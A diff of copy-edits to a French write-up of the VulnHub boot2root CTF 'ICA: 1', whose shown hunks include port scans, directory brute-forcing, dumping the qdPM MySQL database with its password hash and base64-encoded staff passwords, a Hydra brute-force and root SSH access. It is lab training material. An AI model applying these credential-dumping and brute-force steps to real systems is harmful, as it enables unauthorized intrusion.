@@ -6,13 +6,13 @@ tags: [CTF, VulnHub]
 Présentation
 ------------
 
-[ICA: 1](https://www.vulnhub.com/entry/ica-1,748/) est un CTF de type boot2root proposé par [Onur Turalı](https://twitter.com/turali_onur) et récupérable depuis VulnHub.  
+[ICA: 1](https://www.vulnhub.com/entry/ica-1,748/) est un CTF de type boot2root proposé par [Onur Turalı](https://twitter.com/turali_onur) et récupérable depuis _VulnHub_.  
 
 On dispose d'un petit synopsis pour se mettre dans l'ambiance :  
 
 > According to information from our intelligence network, ICA is working on a secret project. We need to find out what the project is. Once you have the access information, send them to us. We will place a backdoor to access the system later. You just focus on what the project is. You will probably have to go through several layers of security. The Agency has full confidence that you will successfully complete this mission. Good Luck, Agent!
 
-Parmi les ports ouverts on trouve un SSH, un serveur web, un mysql et un autre que Nmap devine comme étant probablement du mysqlx (une spécificité récente de mysql, je n'en sait pas plus) :  
+Parmi les ports ouverts on trouve un SSH, un serveur web, un mysql et un autre que Nmap devine comme étant probablement du mysqlx (une spécificité récente de mysql, je n'en sais pas plus) :  
 
 ```
 Nmap scan report for 192.168.2.9
@@ -54,7 +54,7 @@ PORT      STATE SERVICE VERSION
 |_    HY000
 ```
 
-J'ai aussi lancé *feroxbuster* qui n'a pas remonté grand chose d'intéressant :  
+J'ai aussi lancé `feroxbuster` qui n'a pas remonté grand-chose d'intéressant :  
 
 ```console
 $ feroxbuster -u http://192.168.2.9/ -w raft-large-directories.txt -t 10 -n
@@ -93,7 +93,7 @@ by Ben "epi" Risher 🤓                 ver: 2.4.0
 Avant tout il faut une faille
 -----------------------------
 
-À la racine du site, on trouve une installation de *qdPM* et un numéro de version : 9.2.  
+À la racine du site, on trouve une installation de `qdPM` et un numéro de version : 9.2.  
 
 En se rendant sur le site de l'éditeur, on découvre qu'il s'agit de la dernière version en date. On a aussi un bref descriptif du logiciel :  
 
@@ -184,9 +184,9 @@ Enter password:
 ERROR:
 ```
 
-C'est peut-être relatif à ma version de MySQL : *mysql Ver 15.1 Distrib 10.6.5-MariaDB, for Linux (x86\_64) using EditLine wrapper*  
+C'est peut-être relatif à ma version de MySQL : `mysql Ver 15.1 Distrib 10.6.5-MariaDB, for Linux (x86_64) using EditLine wrapper`  
 
-Vu que j'ai un mysql plus *"standard"* sur une autre machine je switch dessus et je forward le port :  
+Vu que j'ai un mysql plus *"standard"* sur une autre machine je switche dessus et je forward le port :  
 
 ```console
 $ ssh -L 4444:192.168.2.9:3306 devloop@192.168.1.47
@@ -232,7 +232,7 @@ Je ne vais pas me taper l'inspection de toutes les dbs et tables manuellement al
 $ mysqldump -u qdpmadmin -h 127.0.0.1 -P 4444 -p qdpm > /tmp/qdpm.sql
 ```
 
-Il n'y a plus qu'à chercher les occurrences de *INSERT* dans le dump. Celle-ci est intéressante :  
+Il n'y a plus qu'à chercher les occurrences de `INSERT` dans le dump. Celle-ci est intéressante :  
 
 ```sql
 INSERT INTO `configuration` VALUES (1,'app_administrator_email','admin@localhost.com'),(2,'app_administrator_password','$P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0'),
@@ -249,7 +249,7 @@ Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 ```
 
-Toutefois, ça ne semble mener nulle part. Je passe à la base *staff* :  
+Toutefois, ça ne semble mener nulle part. Je passe à la base `staff` :  
 
 ```sql
 INSERT INTO `login` VALUES (1,2,'c3VSSkFkR3dMcDhkeTNyRg=='),(2,4,'N1p3VjRxdGc0MmNtVVhHWA=='),(3,1,'WDdNUWtQM1cyOWZld0hkQw=='),(4,3,'REpjZVZ5OThXMjhZN3dMZw=='),(5,5,'Y3FObkJXQ0J5UzJEdUpTeQ==');
@@ -275,7 +275,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-23 12:52:
 Step up
 -------
 
-On trouve un flag dans le dossier de l'utilisateur Travis :  
+On trouve un flag dans le dossier de l'utilisateur `Travis` :  
 
 ```console
 travis@debian:~$ cat user.txt
@@ -379,12 +379,11 @@ Plus qu'à récupérer notre accès :
 
 ```console
 $ ssh root@192.168.2.9
-Enter passphrase for key '/home/sirius/.ssh/id_rsa':
+Enter passphrase for key '/home/devloop/.ssh/id_rsa':
 root@debian:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@debian:~# cat root.txt
 ICA{Next_Generation_Self_Renewable_Genetics}
 ```
-
 
 *Published November 23 2021 at 13:18*
